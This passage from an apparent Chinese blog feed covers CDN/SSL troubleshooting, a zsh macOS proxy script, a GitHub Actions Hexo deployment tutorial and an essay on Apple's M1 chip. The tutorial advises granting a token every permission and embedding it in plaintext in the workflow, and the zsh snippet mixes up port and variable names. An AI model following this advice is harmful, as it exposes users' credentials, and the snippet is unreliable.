证书服务，但使用「加速节点」可能导致无法正确签发。</p>\n<p>解决方法：使用智能 DNS，将「境外」的记录解析至控制面板提供给您的官方地址。</p>\n<hr>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%90%AF-SSL-%E5%90%8E%E8%AE%BF%E9%97%AE%E9%94%99%E8%AF%AF%EF%BC%9F\" class=\"headerlink\" title=\"开启 SSL 后访问错误？\"></a>开启 SSL 后访问错误？</h3>\n<p>试着为源站配置 SSL 证书，然后前往官方控制台（<a href=\"https://dash.cloudflare.com/\">https://dash.cloudflare.com</a>）将域名的 SSL 设为「完全」。</p>\n<p>注意：使用「完全」方式请务必确定源站已开启 SSL！</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%80%9F%E5%BA%A6\" class=\"headerlink\" title=\"速度\"></a>速度</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PING cf.record.yfun.top (141.101.115.11): 56 data bytes</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=0 ttl=52 time=17.007 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=1 ttl=52 time=16.363 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=2 ttl=52 time=21.385 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=3 ttl=52 time=19.305 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=4 ttl=52 time=16.341 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=5 ttl=52 time=23.181 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=6 ttl=52 time=18.888 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=7 ttl=52 time=18.087 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=8 ttl=52 time=16.153 ms</span><br><span class=\"line\">64 bytes from 141.101.115.11: icmp_seq=9 ttl=52 time=19.363 ms</span><br><span class=\"line\"></span><br><span class=\"line\">--- cf.record.yfun.top ping statistics ---</span><br><span class=\"line\">10 packets transmitted, 10 packets received, 0.0% packet loss</span><br><span class=\"line\">round-trip min/avg/max/stddev = 16.153/18.607/23.181/2.209 ms</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/995700211/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"利用 GitHub Action 自动部署 Hexo 博客","date":"2020-11-29 07:45:00","description":"\n<h1>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h1>\n<p>使用 Hexo 写博客，每次写完都要生成静态文件，而且 Hexo 基于 <code>Node.JS</code>，不能再手机上更新。</p>\n<p>所以每次提交过后发现自己码错字了，或是有同学来换友链，总是要麻烦的改文件，再上传。</p>\n<p>那么，Hexo 如何进行在线更新呢？</p>\n<p>如果使用服务器的话，就丧失了使用 Hexo 的最大的优点——节省开支，而且还不如用 <code>Typecho/WordPress</code> 呢。</p>\n<p>后来突然想到 <code>GitHub Action</code> 可以实现在线打包等操作，就想试试在线生成 Hexo 博客。</p>\n<hr>\n<h1>\n<a href=\"https://blog.yfun.top/#%E8%A1%8C%E5%8A%A8\" class=\"headerlink\" title=\"行动\"></a>行动</h1>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96-GitHub-%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取 GitHub 令牌\"></a>获取 GitHub 令牌</h2>\n<p>登录你的 GitHub 账号，点击右上角的头像，点击「Settings」进入设置。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/2rxI7G.png\"><p>点击菜单栏中的「Developer settings」进入开发者设置。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/ak0J1J.png\"><p>点击菜单栏中的「Personal access tokens」进入令牌设置。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/ZqiWw8.png\"><p>点击「Generate new token」新建一个令牌。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/JCHxQx.png\"><p>勾选全部的权限，名称随意。</p>\n<p>并点击「Generate token」完成生成。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/6rzspL.png\"><p>记得保存好这个令牌，它不会再次出现。</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h2>\n<p>使用 GitHub 新建一个存放 Hexo 文件的仓库，<strong>要选私有仓库</strong>！</p>\n<p><strong>不要勾选</strong>任何的初始化仓库选项！</p>\n<p>在 Hexo 根目录中删除 <code>.git</code> 文件夹(隐藏文件夹)，删除主题目录下的 <code>.git</code> 文件夹。</p>\n<p>然后在 Hexo 根目录下使用 <code>cmd</code> 或终端运行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git init <span class=\"comment\"># 新建 Git 仓库</span></span><br><span class=\"line\">git add -A  <span class=\"comment\"># 暂存所有文件</span></span><br><span class=\"line\">git commit -m <span class=\"string\">\"Create\"</span> <span class=\"comment\"># 提交更新</span></span><br><span class=\"line\">git remote add origin https://github.com/用户名/新建的私有仓库名.git <span class=\"comment\"># 新增远程链接</span></span><br><span class=\"line\">git push -u origin master <span class=\"comment\"># 推送至远程仓库</span></span><br></pre></td></tr></table></figure><hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE-Github-Action\" class=\"headerlink\" title=\"配置 Github Action\"></a>配置 Github Action</h2>\n<p>进入仓库页面，点击「Action」，点击「 set up a workflow yourself 」。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/P5LacM.png\"><p>在左侧代码编辑器中将下方提供的代码粘贴进入代码框。</p>\n<p>请仔细阅读注释，修改最后几行的提交设置。</p>\n<p>确认无误后点击右上角的「Start Commit」。</p>\n<blockquote><p>此处注意！「公开的仓库名」是生成后文件提交的公开仓库，供「GitHub Pages」「Vercel」等服务使用！</p></blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"comment\"># 部署</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"attr\">on:</span> <span class=\"comment\"># 触发条件</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span> <span class=\"comment\"># 推送到 master 分支</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">    <span class=\"attr\">types:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">published</span> <span class=\"comment\"># 推送新版本号</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span> <span class=\"comment\"># 手动触发</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">build:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span> <span class=\"comment\"># Checkout 仓库</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span> <span class=\"comment\"># 安装 Node.js</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">Hexo</span> <span class=\"comment\"># 安装 Hexo</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">hexo-cli</span> <span class=\"string\">-g</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Cache</span> <span class=\"string\">Modules</span> <span class=\"comment\"># 缓存 Node 插件</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/cache@v1</span></span><br><span class=\"line\">      <span class=\"attr\">id:</span> <span class=\"string\">cache-modules</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">path:</span> <span class=\"string\">node_modules</span></span><br><span class=\"line\">        <span class=\"attr\">key:</span> <span class=\"string\">${{runner.OS}}-${{hashFiles('**/package-lock.json')}}</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">Dependencies</span> <span class=\"comment\"># 如果没有缓存或 插件有更新，则安装插件</span></span><br><span class=\"line\">      <span class=\"attr\">if:</span> <span class=\"string\">steps.cache-modules.outputs.cache-hit</span> <span class=\"type\">!=</span> <span class=\"string\">'true'</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span> <span class=\"comment\"># 如果仓库里没有 package-lock.json，上传一下，npm ci 必须要有 package-lock.json</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">ci</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Generate</span> <span class=\"comment\"># 生成</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">hexo</span> <span class=\"string\">clean</span></span><br><span class=\"line\">        <span class=\"string\">hexo</span> <span class=\"string\">generate</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"comment\"># 部署</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"HiFun\"</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"omycoke@outlook.com\"</span></span><br><span class=\"line\">        <span class=\"string\">export</span> <span class=\"string\">TZ='Asia/Shanghai'</span></span><br><span class=\"line\">        <span class=\"string\">cd</span> <span class=\"string\">public/</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">init</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Create by workflows\"</span></span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">remote</span> <span class=\"string\">add</span> <span class=\"string\">origin</span> [<span class=\"string\">https://令牌@github.com/用户名/公开的仓库名</span>]</span><br><span class=\"line\">        <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span> <span class=\"string\">-f</span></span><br></pre></td></tr></table></figure><img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/n65GGW.png\"><hr>\n<h1>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h1>\n<p>每次更改完文件过后，在 Hexo 根目录运行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git add -A</span><br><span class=\"line\">git commit -m <span class=\"string\">\"Update\"</span></span><br><span class=\"line\">git push origin master</span><br></pre></td></tr></table></figure><p>也可直接在仓库中 改文件/写博文 效果一样，GitHub 都会为你自动生成文件。</p>\n","link":"https://blog.yfun.top/posts/2241387868/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a 